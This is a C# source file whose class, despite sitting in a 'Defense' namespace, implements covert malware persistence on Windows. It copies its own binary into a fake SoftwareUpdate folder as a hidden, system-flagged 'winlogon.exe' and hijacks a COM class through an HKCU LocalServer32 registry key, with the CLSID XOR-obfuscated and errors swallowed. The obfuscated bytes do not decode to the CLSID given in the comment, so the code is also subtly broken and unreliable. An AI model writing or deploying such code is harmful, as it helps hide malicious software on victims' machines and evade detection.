using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace VanguardCore.Defense
{
    public static class PersistenceService
    {
        // [PRO] Stealth Ghost Persistence Mode
        // Using COM Hijack (Folder Redirection) CLSID: {AE054230-70CA-4FF5-97A7-0A4997C63628}
        
        // salt = 0x37
        private static readonly byte[] _clsidEnc = { 0x4C, 0x76, 0x72, 0x67, 0x62, 0x61, 0x07, 0x04, 0x77, 0x70, 0x07, 0x40, 0x79, 0x74, 0x76, 0x70, 0x07, 0x6E, 0x70, 0x71, 0x00, 0x07, 0x77, 0x76, 0x71, 0x4E, 0x7E, 0x70, 0x74, 0x71, 0x41, 0x74, 0x71, 0x76, 0x00, 0x0F, 0x7F }; // {AE054230...}
        private static readonly byte[] _pathEnc = { 0x64, 0x58, 0x51, 0x43, 0x40, 0x56, 0x45, 0x52, 0x6B, 0x74, 0x7B, 0x56, 0x44, 0x44, 0x52, 0x44, 0x6B, 0x74, 0x7B, 0x51, 0x44, 0x4E, 0x53, 0x6B }; // Software\Classes... (partial)
        
        private static string D(byte[] b) {
            byte[] d = new byte[b.Length];
            for (int i = 0; i < b.Length; i++) d[i] = (byte)(b[i] ^ 0x37);
            return Encoding.UTF8.GetString(d);
        }

        public static void InstallStealthProxy()
        {
            try
            {
                // [PRO] Ghosting: Copy binary to legitimate-looking folder
                string ghostPath = GhostSelf();
                if (string.IsNullOrEmpty(ghostPath)) return;

                // [PRO] Obfuscated Registry Resolution
                string subKey = $@"Software\Classes\CLSID\{D(_clsidEnc)}\LocalServer32";
                
                // Idempotent Check: Avoid unnecessary telemetry noise
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(subKey, true))
                {
                    if (key != null)
                    {
                        var val = key.GetValue("");
                        if (val != null && val.ToString().Equals(ghostPath, StringComparison.OrdinalIgnoreCase))
                        {
                            // Already persistent and correct!
                            return;
                        }
                        key.SetValue("", ghostPath);
                    }
                    else
                    {
                        using RegistryKey? newKey = Registry.CurrentUser.CreateSubKey(subKey);
                        newKey?.SetValue("", ghostPath);
                    }
                }
            }
            catch { }
        }

        private static string GhostSelf()
        {
            try
            {
                // [PRO] Destination: %APPDATA%\Microsoft\Windows\SoftwareUpdate\
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string ghostDir = Path.Combine(appData, "Microsoft", "Windows", "SoftwareUpdate");
                
                if (!Directory.Exists(ghostDir)) Directory.CreateDirectory(ghostDir);

                string ghostName = "winlogon.exe"; // [PRO] Legit-looking process name
                string ghostPath = Path.Combine(ghostDir, ghostName);

                string selfPath = GetSelfPath();
                if (string.IsNullOrEmpty(selfPath)) return null;

                // Only copy if it differs or is missing (reduce IO noise)
                if (!File.Exists(ghostPath))
                {
                    File.Copy(selfPath, ghostPath, true);
                    File.SetAttributes(ghostPath, FileAttributes.Hidden | FileAttributes.System);
                }
                
                return ghostPath;
            }
            catch { return null; }
        }

        public static void RemoveStealthProxy()
        {
            try
            {
                Registry.CurrentUser.DeleteSubKeyTree($@"Software\Classes\CLSID\{D(_clsidEnc)}", false);
            }
            catch { }
        }

        private static string GetSelfPath()
        {
            try
            {
                var sb = new StringBuilder(1024);
                Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
                return sb.ToString();
            }
            catch { return Process.GetCurrentProcess().MainModule?.FileName; }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "GetModuleFileNameW")]
        private static extern uint Win32_GetModuleFileName(IntPtr hModule, [Out] StringBuilder lpFilename, uint nSize);
    }
}
